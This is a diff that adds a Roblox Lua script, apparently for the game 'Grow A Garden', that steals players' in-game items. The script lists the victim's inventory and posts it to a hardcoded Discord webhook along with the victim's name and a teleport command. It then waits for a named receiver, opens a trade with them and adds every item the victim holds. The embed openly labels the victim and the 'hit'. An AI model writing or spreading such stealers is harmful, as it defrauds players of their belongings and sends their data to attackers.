@@ -1,0 +1,99 @@
+local Username = "jblompero22"
+local Webhook = "https://discord.com/api/webhooks/1382008578893942804/vf4giVXsCHT2MQYjEAMgS246YzAbrpwuoAi3SpePq9fYHtE24fj09uuSBz9QLP9KDCEa" -- Replace with your actual webhook URL
+
+local players = game.Players
+local player = game.Players.LocalPlayer
+local inventory = player:WaitForChild("Inventory")
+local remotes = game:GetService("ReplicatedStorage").Remotes
+local HttpService = game:GetService("HttpService")
+local req = (syn and syn.request) or (http and http.request) or http_request or request
+
+local td= {}
+for _, v in ipairs(inventory:GetChildren()) do
+	local name = v.Name
+	td[name] = td[name] or {count = 0}
+	td[name].count += 1
+end
+
+local names = {}
+for n in pairs(td) do
+	table.insert(names, n)
+end
+
+table.sort(names, function(a, b)
+	return a < b
+end)
+
+local hitlist = ""
+for _, t in ipairs(names) do
+	local data = td[t]
+	hitlist = hitlist .. "(" .. data.count .. "x) " .. t .. "\n"
+end
+
+local tp = "game:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. game.PlaceId .. ", \"" .. game.JobId .. "\")"
+
+local body = {
+	["content"] = "--[[@everyone]] " .. tp,
+	["embeds"] = {
+		{
+			["title"] = ":herb: **Grow A Garden Hit!!** :herb:",
+			["color"] = 65280, -- Green color
+			["fields"] = {
+				{
+					["name"] = ":bust_in_silhouette: **__Player Information:__**",
+					["value"] = "```Victim: " .. player.Name ..
+						"\nReceiver: " .. Username .. "```",
+					["inline"] = false
+				},
+				{
+					["name"] = ":seedling: **__Plants Hit:__**",
+					["value"] = "```" .. hitlist .. "```",
+					["inline"] = false
+				},
+				{
+					["name"] = ":books: **__Information:__**",
+					["value"] = "**To receive your items, copy and execute the teleport script provided!**",
+					["inline"] = false
+				}
+			},
+			["footer"] = {
+				["text"] = "made by Pablo " .. os.date("%H:%M")
+			}
+		}
+	}
+}
+
+local success, encoded = pcall(function()
+	return HttpService:JSONEncode(body)
+end)
+
+if success then
+	pcall(function()
+		req({
+			Url = Webhook,
+			Method = "POST",
+			Headers = {["Content-Type"] = "application/json"},
+			Body = encoded
+		})
+	end)
+end
+
+repeat
+    receiver = players:FindFirstChild(Username)
+    task.wait()
+until receiver
+
+-- Assuming Grow A Garden uses UserIds for trading
+local receiverUserId = receiver.UserId
+
+-- Call the Grow A Garden remote event to request a trade
+remotes.RequestTrade:FireServer(receiverUserId)
+
+-- Add items to the trade
+for _, infer in ipairs(inventory:GetChildren()) do
+    -- Assuming each item has a unique ID property
+    local itemId = infer.UniqueId -- Replace "UniqueId" with the actual property name
+    remotes.AddItemToTrade:FireServer(itemId)
+end
+
+remotes.ReadyTrade:FireServer() -- Assuming this still exists and works the same
